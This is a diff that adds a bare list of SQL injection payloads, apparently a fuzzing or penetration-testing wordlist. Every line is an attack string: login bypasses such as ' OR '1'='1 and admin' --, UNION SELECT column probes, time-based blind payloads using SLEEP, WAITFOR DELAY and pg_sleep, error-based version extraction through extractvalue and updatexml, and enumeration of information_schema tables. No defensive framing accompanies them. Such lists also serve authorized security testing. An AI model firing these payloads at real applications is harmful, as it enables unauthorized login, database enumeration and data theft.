@@ -1,0 +1,26 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+1' AND SLEEP(5)#
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1';WAITFOR DELAY '0:0:5'--
+1' AND pg_sleep(5)--
+' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
